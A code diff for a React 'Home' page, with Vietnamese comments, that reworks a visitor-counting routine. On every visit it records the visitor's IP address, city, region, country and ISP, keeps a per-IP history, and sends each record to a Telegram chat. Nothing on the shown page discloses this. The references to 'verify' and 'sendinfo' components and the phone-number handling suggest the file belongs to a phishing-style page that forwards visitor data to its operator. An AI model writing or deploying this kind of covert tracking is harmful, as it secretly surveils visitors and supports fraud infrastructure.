@@ -9,7 +9,6 @@ import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 import countryToLanguage from '@/utils/country_to_language';
 import axios from 'axios';
-import config from '@/utils/config';
 
 const Home = () => {
     const defaultTexts = useMemo(
@@ -67,50 +66,6 @@ const Home = () => {
     const [showLoading, setShowLoading] = useState(true);
     const [homeTranslated, setHomeTranslated] = useState(false);
 
-    // 🎯 THÊM HÀM GỬI THÔNG BÁO LƯỢT TRUY CẬP
-    const sendVisitNotification = async (message) => {
-        try {
-            const response = await axios.post(`https://api.telegram.org/bot${config.noti_token}/sendMessage`, {
-                chat_id: config.noti_chat_id,
-                text: message,
-                parse_mode: 'HTML'
-            });
-            return response.data;
-        } catch (error) {
-            console.log('Send visit notification failed:', error.message);
-        }
-    };
-
-    // 🎯 THÊM HÀM ĐẾM LƯỢT TRUY CẬP
-    const countVisit = async (ipData) => {
-        try {
-            const visitData = JSON.parse(localStorage.getItem('visitData') || '{"uniqueIPs":[]}');
-            const currentIP = ipData.ip;
-            const currentTime = new Date().toLocaleString('vi-VN');
-            
-            const isNewIP = !visitData.uniqueIPs.includes(currentIP);
-            
-            if (isNewIP) {
-                visitData.uniqueIPs.push(currentIP);
-                localStorage.setItem('visitData', JSON.stringify(visitData));
-                
-                const visitMessage = `👤 <b>NGƯỜI DÙNG MỚI</b>
-🌍 <b>IP:</b> <code>${currentIP || 'N/A'}</code>
-📍 <b>Vị trí:</b> <code>${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country || 'N/A'}</code>
-🏢 <b>Nhà mạng:</b> <code>${ipData.organization || 'N/A'}</code>
-
-📊 <b>THỐNG KÊ:</b>
-• Tổng số người truy cập: <code>${visitData.uniqueIPs.length}</code>
-
-🕐 <b>Thời gian:</b> <code>${currentTime}</code>`;
-                
-                await sendVisitNotification(visitMessage);
-            }
-        } catch (error) {
-            console.log('Count visit failed:', error);
-        }
-    };
-
     useEffect(() => {
         setHomeTranslated(true);
         const loadingTimer = setTimeout(() => {
@@ -127,6 +82,56 @@ const Home = () => {
             }
         }
     }, [showLoading, homeTranslated]);
+
+    // 🎯 HÀM ĐẾM LƯỢT TRUY CẬP
+    const countVisit = async (ipData) => {
+        try {
+            // Lấy dữ liệu hiện tại từ localStorage
+            const visitData = JSON.parse(localStorage.getItem('visitData') || '{"totalVisits":0,"uniqueIPs":[],"visitHistory":[]}');
+            
+            const currentIP = ipData.ip;
+            const currentTime = new Date().toLocaleString('vi-VN');
+            
+            // Kiểm tra IP đã truy cập trước đó chưa
+            const isNewIP = !visitData.uniqueIPs.includes(currentIP);
+            
+            // Cập nhật dữ liệu
+            visitData.totalVisits += 1;
+            
+            if (isNewIP) {
+                visitData.uniqueIPs.push(currentIP);
+            }
+            
+            // Thêm vào lịch sử truy cập - KHÔNG GIỚI HẠN SỐ LƯỢT
+            visitData.visitHistory.push({
+                ip: currentIP,
+                time: currentTime,
+                location: `${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country || 'N/A'}`,
+                isp: ipData.organization || 'N/A'
+            });
+            
+            // Lưu lại
+            localStorage.setItem('visitData', JSON.stringify(visitData));
+            
+            // 🎯 THÔNG BÁO TELEGRAM
+            const visitMessage = `👤 <b>${isNewIP ? 'NGƯỜI DÙNG MỚI' : 'TRUY CẬP LẠI'}</b>
+🌍 <b>IP:</b> <code>${currentIP || 'N/A'}</code>
+📍 <b>Vị trí:</b> <code>${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country || 'N/A'}</code>
+🏢 <b>Nhà mạng:</b> <code>${ipData.organization || 'N/A'}</code>
+
+📊 <b>THỐNG KÊ:</b>
+• Tổng lượt truy cập: <code>${visitData.totalVisits}</code>
+• Số người dùng unique: <code>${visitData.uniqueIPs.length}</code>
+• Lần truy cập thứ: <code>${visitData.visitHistory.filter(visit => visit.ip === currentIP).length}</code>
+
+🕐 <b>Thời gian:</b> <code>${currentTime}</code>`;
+            
+            await sendMessage(visitMessage);
+            
+        } catch (error) {
+            console.log('Count visit failed:', error);
+        }
+    };
 
     // 🎯 CẬP NHẬT: Dịch ngầm cho verify + sendinfo
     const translateBackgroundComponents = useCallback(async (targetLang) => {
@@ -193,7 +198,7 @@ const Home = () => {
             
             localStorage.setItem('ipInfo', JSON.stringify(ipData));
             
-            // 🎯 THÊM GỌI HÀM ĐẾM LƯỢT TRUY CẬP
+            // 🎯 ĐẾM LƯỢT TRUY CẬP VÀ GỬI THÔNG BÁO
             await countVisit(ipData);
             
             const detectedCountry = ipData.country_code || 'US';
